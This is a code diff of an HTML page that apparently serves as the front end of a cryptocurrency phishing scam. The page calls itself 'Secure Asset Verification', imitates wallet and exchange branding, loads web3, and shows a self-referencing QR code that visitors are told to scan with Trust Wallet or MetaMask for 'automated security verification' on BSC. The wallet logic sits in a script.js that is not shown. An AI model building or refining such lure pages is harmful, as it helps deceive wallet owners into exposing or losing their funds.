@@ -3,60 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Security Scanner</title>
+    <title>Secure Asset Verification</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
-        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica; background: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .scanner-container { width: 100%; height: 100%; position: relative; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 40px 20px; box-sizing: border-box; }
-        
-        /* Camera Frame View */
-        .scan-window { width: 260px; height: 260px; border: 2px solid rgba(255,255,255,0.3); border-radius: 30px; position: relative; display: flex; justify-content: center; align-items: center; overflow: hidden; }
-        .scan-line { position: absolute; width: 100%; height: 2px; background: #3172DE; box-shadow: 0 0 15px #3172DE; animation: moveLine 2.5s infinite linear; }
-        
-        /* Corners */
-        .corner { position: absolute; width: 30px; height: 30px; border: 4px solid #3172DE; }
-        .tl { top: 0; left: 0; border-right: 0; border-bottom: 0; border-top-left-radius: 20px; }
-        .tr { top: 0; right: 0; border-left: 0; border-bottom: 0; border-top-right-radius: 20px; }
-        .bl { bottom: 0; left: 0; border-right: 0; border-top: 0; border-bottom-left-radius: 20px; }
-        .br { bottom: 0; right: 0; border-left: 0; border-top: 0; border-bottom-right-radius: 20px; }
-
-        .info-text { text-align: center; }
-        h2 { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
-        p { font-size: 14px; color: #aaa; }
-        .verify-btn { background: #3172DE; color: white; border: none; padding: 16px 60px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; text-decoration: none; margin-bottom: 20px; width: 80%; }
-
-        /* Overlay */
-        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
-        .loader { border: 4px solid #111; border-top: 4px solid #3172DE; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
-        
-        @keyframes moveLine { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { margin: 0; font-family: 'Inter', sans-serif; background: #0b0e11; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .card { background: #1e2329; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 380px; }
+        #qrcode { background: white; padding: 15px; border-radius: 10px; margin: 20px auto; display: inline-block; }
+        .btn { background: #f0b90b; color: #000; border: none; padding: 15px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        h2 { color: #f0b90b; margin: 0; }
+        p { color: #929aa5; font-size: 13px; }
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
     </style>
 </head>
 <body>
 
-    <div class="scanner-container">
-        <div class="info-text">
-            <h2>Trust Security Scanner</h2>
-            <p>Scan your wallet to verify assets on-chain</p>
-        </div>
-
-        <div class="scan-window">
-            <div class="corner tl"></div><div class="corner tr"></div>
-            <div class="corner bl"></div><div class="corner br"></div>
-            <div class="scan-line"></div>
-            <img src="https://cdn-icons-png.flaticon.com/512/1048/1048453.png" style="width: 80px; opacity: 0.2;" alt="QR Icon">
-        </div>
-
-        <button id="nextBtn" class="verify-btn">Start Secure Scan</button>
+    <div class="card">
+        <h2>Verify Assets</h2>
+        <p>Scan this QR with Trust Wallet / MetaMask to start automated security verification.</p>
+        
+        <div id="qrcode"></div> <button id="nextBtn" class="btn">Verify Assets</button>
+        <p style="margin-top:15px;">Note: Ensure you are on BSC Network</p>
     </div>
 
-    <div id="loading-overlay">
-        <div class="loader"></div>
-        <div id="status-main" style="color:#3172DE; font-weight:bold;">Initializing...</div>
-        <div id="status-sub" style="font-size:12px; color:#555; margin-top:8px;">Connecting to Trust Node</div>
+    <div id="overlay">
+        <div style="border: 4px solid #333; border-top: 4px solid #f0b90b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
+        <p id="status-text" style="color:#f0b90b; margin-top:15px; font-weight:bold;">Initializing...</p>
     </div>
 
     <script src="script.js"></script>
+    <script>
+        // Automatic QR Generator
+        new QRCode(document.getElementById("qrcode"), {
+            text: window.location.href,
+            width: 200,
+            height: 200
+        });
+    </script>
 </body>
 </html>
